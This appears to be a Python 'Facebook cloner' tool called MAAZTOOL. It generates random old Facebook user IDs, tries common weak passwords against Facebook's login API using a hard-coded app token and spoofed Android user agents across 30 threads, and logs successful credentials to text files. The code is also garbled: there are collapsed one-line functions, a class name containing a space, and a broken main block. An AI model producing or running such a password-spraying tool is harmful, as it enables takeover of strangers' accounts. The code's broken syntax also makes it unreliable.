#=====[🌿] DEVELOPER: MAAZTOOL OFFICIAL VERSION v1.9 #=====[🌿] BASE LOGIC BY: Asad Nazeer/ MUNNA (RESPECT) #=====[🌿] ALL RIGHTS PRESERVED BY @MAAZTOOL v1.9

import os
import sys
import json
import uuid
import string
import random
import requests
from time import sleep
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# ===== COLOR CODES =====
R = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;226m'
B = '\x1b[38;5;44m'
P = '\x1b[38;5;201m'
W = '\x1b[0;97m'
N = '\x1b[0m'

class Maaz Cloner:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.generated_ids = []


#================= TOOLS =================

def best_redmi_ua():
    models = [
        {"model": "Redmi Note 13", "code": "2312DRAABC", "android": "13", "res": (1080, 2400)},
        {"model": "Redmi 9", "code": "Lancelot", "android": "10", "res": (720, 1600)}
    ]
    m = random.choice(models)
    density = round(random.uniform(2.0, 3.5), 2)
    w, h = m["res"]
    return (
        f"[FBAN/FB4A;FBAV/{random.randint(300, 450)}.0.0.{random.randint(1, 30)}.{random.randint(50, 150)};"
        f"FBDM={{density={density},width={w},height={h}}};FBLC/en_US;FBMF/Xiaomi;FBBD/Redmi;FBDV/{m['code']};"
        f"FBSV/{m['android']};FBOP/1;FBCA/arm64-v8a;]"
    )

def get_year_from_uid(uid):
    uid = str(uid)
    if len(uid) == 15:
        if uid[:5] in ["10000", "10001", "10002"]:
            return "2008-2010"
        elif uid[:5] in ["10003", "10004", "10005"]:
            return "2011-2013"
        elif uid[:5] in ["10006", "10007"]:
            return "2014-2016"
        elif uid[:5] in ["10008", "10009"]:
            return "2017-2020"
        else:
            return "2021+"
    elif len(uid) == 14:
        return "2007-2008"
    elif len(uid) == 13:
        return "2006-2007"
    else:
        return "Unknown"
def login(uid, pw): global oks, cps try: session = requests.Session() headers = { 'User-Agent': best_redmi_ua(), 'Content-Type': 'application/x-www-form-urlencoded' } data = { 'email': uid, 'password': pw, 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'locale': 'en_US', 'format': 'json', 'generate_session_cookies': '1', 'generate_analytics_claims': '1' } res = session.post('https://api.facebook.com/auth/login', data=data, headers=headers).json()

if 'access_token' in res:
        print(f"\r{G}[MAAZ-OK] {uid} | {pw} | {get_year_from_uid(uid)}{N}")
        oks.append(f"{uid}|{pw}")
        with open("ok.txt", "a") as f:
            f.write(f"{uid}|{pw}\n")
    elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
        print(f"\r{Y}[MAAZ-CP] {uid} | {pw}{N}")
        cps.append(f"{uid}|{pw}")
        with open("cp.txt", "a") as f:
            f.write(f"{uid}|{pw}\n")
except Exception as e:
    pass

#================= MODULE: OLD UID CRACKER =================

def old_uid_cracker(): os.system("clear") print(f"{G}OLD UID AUTO CRACKER | MAAZTOOL v1.9{N}\n") try: limit = int(input(f"{Y}How many UIDs? ➤ {G}")) except: print(f"{R}Enter a valid number.{N}"); return uid_series = ['100000', '100001', '100002', '100003', '100004'] uid_list = [] for _ in range(limit): prefix = random.choice(uid_series) suffix = ''.join(random.choices(string.digits, k=8)) uid_list.append(prefix + suffix) passlist = ['123456', '12345678', '786786', '112233', 'password', 'pakistan123'] with ThreadPool(max_workers=30) as pool: for uid in uid_list: pool.submit(start_crack, uid, passlist)

def start_crack(uid, passwords): global loop for pw in passwords: login(uid, pw) loop += 1 sys.stdout.write(f"\r{W}MAAZTOOL {loop} | OK: {G}{len(oks)}{W} | CP: {Y}{len(cps)}{N} ") sys.stdout.flush()

#================= MAIN =================

def main(): os.system("clear") print(f"""{G} ╔═══════════════════════════════════╗ ║         {Y}MAAZTOOL v1.9 FINAL BUILD        {G}║ ║         FAST FB RANDOM CLONER         ║ ╚═══════════════════════════════════╝{N}") print("\n1. Start OLD UID Cracker (Auto)") print("0. Exit\n") opt = input(f"{Y}SELECT OPTION ➤ {G}") if opt == "1": old_uid_cracker() else: exit()

if name == "main": Asad Nazeer: main() except KeyboardInterrupt: print(f"\n{R}Exit by Asad Nazeer.{N}")

